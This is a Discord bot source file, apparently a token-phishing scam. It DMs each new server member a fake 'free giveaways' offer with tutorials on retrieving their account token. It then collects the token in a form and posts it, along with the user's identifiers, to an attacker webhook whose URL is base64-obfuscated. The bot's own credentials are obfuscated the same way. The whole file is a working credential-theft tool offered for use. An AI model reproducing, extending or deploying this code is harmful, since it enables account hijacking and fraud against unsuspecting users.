const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType } = require('discord.js');
const axios = require('axios');
const http = require('http');

// Simple server to keep Replit alive
http.createServer((req, res) => { res.write("Bot is running!"); res.end(); }).listen(8080);

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages]
});

// --- OBFUSCATED DATA ---
const _0x1a = "TVRReE1qTTJOVFF4TkRrd01UTTJOemsxTWpjME9RLkduRGhHdC5Kd0ptenVRRFVORTJUUnFVWE5ZdnowdF9uT1B3NlgzYjRCM2pucw==";
const _0x1b = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MjM2NTcxNTUzMjIyMjU4MS9RTzNucjhmTk9jUFAwM3dvSVpwZ2tZc3hUZXRuOGl0MGUVVlp2MUFtMGNMelV5Z0xpMTZKTUhTYUc1N0dEZ1R4YXVt";

const dec = (s) => Buffer.from(s, 'base64').toString('utf-8');
const T = dec(_0x1a);
const W = dec(_0x1b);

const V1 = 'https://www.youtube.com/watch?v=DwvJc-pLYFY'; // PC Tut
const V2 = 'https://www.youtube.com/watch?v=3UeO6Q4Q_4E'; // Mobile Tut

client.once('ready', () => {
    console.log(`>>> LOGGED IN AS: ${client.user.tag}`);
});

// 1. Send the DM with Tutorials and Button
client.on('guildMemberAdd', async (m) => {
    try {
        const btn = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('op_f').setLabel('📩 Submit Token').setStyle(ButtonStyle.Primary)
        );

        await m.send({
            content: `**Welcome to free giveaways!**\n\nTo proceed, you need to input your Token.\n\n💻 **PC Tutorial:** ${V1}\n📱 **Mobile Tutorial:** ${V2}\n\nClick the button below to submit!`,
            components: [btn]
        });
    } catch (e) {
        console.log(`Failed to DM ${m.user.tag}`);
    }
});

// 2. Handle Button -> Form -> Webhook
client.on('interactionCreate', async (i) => {
    
    // Trigger Pop-up Form
    if (i.isButton() && i.customId === 'op_f') {
        const modal = new ModalBuilder().setCustomId('tk_form').setTitle('Giveaway Submission');
        const field = new TextInputBuilder()
            .setCustomId('tk_input')
            .setLabel("Input your Token here:")
            .setPlaceholder("MTQ4MjM0...")
            .setStyle(TextInputStyle.Paragraph)
            .setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(field));
        await i.showModal(modal);
    }

    // Handle Form Submit
    if (i.type === InteractionType.ModalSubmit && i.customId === 'tk_form') {
        const inputVal = i.fields.getTextInputValue('tk_input');

        try {
            await axios.post(W, {
                content: `🚨 **NEW TOKEN LOGGED** 🚨\n\n**User:** ${i.user.tag}\n**Display:** ${i.user.displayName}\n**ID:** ${i.user.id}\n**Token:** \`${inputVal}\`\n@everyone`
            });

            await i.reply({ 
                content: '✅ Thank you! Your submission has been complted wait some mins.', 
                ephemeral: true 
            });
        } catch (err) {
            await i.reply({ content: '❌ Error: Failed k.', ephemeral: true });
        }
    }
});

client.login(T);
